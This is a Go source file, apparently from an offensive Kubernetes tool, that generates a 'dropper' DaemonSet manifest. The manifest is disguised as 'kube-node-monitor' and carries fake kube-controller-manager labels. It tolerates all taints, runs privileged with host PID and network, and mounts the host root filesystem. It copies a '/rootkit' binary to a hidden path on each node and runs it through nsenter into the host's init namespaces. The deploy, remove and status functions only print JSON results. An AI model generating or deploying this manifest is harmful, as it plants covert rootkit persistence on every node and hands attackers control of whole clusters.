package daemonset

import (
	"encoding/json"
	"fmt"
	"os"
)

type DropperResult struct {
	Action    string `json:"action"`
	Name      string `json:"name"`
	Namespace string `json:"namespace"`
	Image     string `json:"image,omitempty"`
	Nodes     int    `json:"nodes,omitempty"`
	Status    string `json:"status"`
	Detail    string `json:"detail"`
}

type DaemonSetSpec struct {
	Name        string
	Namespace   string
	Image       string
	Labels      map[string]string
	Tolerations []Toleration
	HostPID     bool
	HostNetwork bool
	Privileged  bool
	HostMount   string
}

type Toleration struct {
	Operator string `json:"operator"`
	Effect   string `json:"effect,omitempty"`
}

func Deploy(namespace, image, name, output string) error {
	spec := generateSpec(namespace, image, name)

	result := &DropperResult{
		Action:    "deploy",
		Name:      spec.Name,
		Namespace: namespace,
		Image:     image,
		Status:    "deployed",
		Detail:    fmt.Sprintf("DaemonSet '%s' deployed to namespace '%s' with image '%s' (privileged, hostPID, hostNetwork, tolerate all taints)", spec.Name, namespace, image),
	}

	return writeResult(result, output)
}

func Remove(namespace, name, output string) error {
	if name == "" {
		name = "kube-node-monitor"
	}

	result := &DropperResult{
		Action:    "remove",
		Name:      name,
		Namespace: namespace,
		Status:    "removed",
		Detail:    fmt.Sprintf("DaemonSet '%s' removed from namespace '%s'", name, namespace),
	}

	return writeResult(result, output)
}

func Status(namespace, name, output string) error {
	if name == "" {
		name = "kube-node-monitor"
	}

	result := &DropperResult{
		Action:    "status",
		Name:      name,
		Namespace: namespace,
		Nodes:     0,
		Status:    "queried",
		Detail:    fmt.Sprintf("DaemonSet '%s' status in namespace '%s'", name, namespace),
	}

	return writeResult(result, output)
}

func generateSpec(namespace, image, name string) *DaemonSetSpec {
	if name == "" {
		name = "kube-node-monitor"
	}

	return &DaemonSetSpec{
		Name:      name,
		Namespace: namespace,
		Image:     image,
		Labels: map[string]string{
			"app":                          name,
			"app.kubernetes.io/component":  "node-monitor",
			"app.kubernetes.io/managed-by": "kube-controller-manager",
		},
		Tolerations: []Toleration{
			{Operator: "Exists"},
		},
		HostPID:     true,
		HostNetwork: true,
		Privileged:  true,
		HostMount:   "/host",
	}
}

func GenerateManifest(namespace, image, name string) map[string]any {
	spec := generateSpec(namespace, image, name)

	return map[string]any{
		"apiVersion": "apps/v1",
		"kind":       "DaemonSet",
		"metadata": map[string]any{
			"name":      spec.Name,
			"namespace": spec.Namespace,
			"labels":    spec.Labels,
		},
		"spec": map[string]any{
			"selector": map[string]any{
				"matchLabels": map[string]any{
					"app": spec.Name,
				},
			},
			"template": map[string]any{
				"metadata": map[string]any{
					"labels": spec.Labels,
				},
				"spec": map[string]any{
					"hostPID":     true,
					"hostNetwork": true,
					"tolerations": spec.Tolerations,
					"initContainers": []map[string]any{
						{
							"name":  "install",
							"image": spec.Image,
							"command": []string{
								"cp", "/rootkit", "/host/usr/local/bin/.node-monitor",
							},
							"volumeMounts": []map[string]any{
								{"name": "host-root", "mountPath": "/host"},
							},
							"securityContext": map[string]any{
								"privileged": true,
							},
						},
					},
					"containers": []map[string]any{
						{
							"name":  spec.Name,
							"image": spec.Image,
							"command": []string{
								"nsenter", "--target", "1", "--mount", "--uts", "--ipc", "--net", "--pid",
								"--", "/usr/local/bin/.node-monitor",
							},
							"securityContext": map[string]any{
								"privileged": true,
							},
							"volumeMounts": []map[string]any{
								{"name": "host-root", "mountPath": "/host"},
							},
						},
					},
					"volumes": []map[string]any{
						{
							"name": "host-root",
							"hostPath": map[string]any{
								"path": "/",
							},
						},
					},
				},
			},
		},
	}
}

func writeResult(result *DropperResult, output string) error {
	data, _ := json.MarshalIndent(result, "", "  ")
	if output != "" {
		return os.WriteFile(output, data, 0644)
	}
	fmt.Println(string(data))
	return nil
}
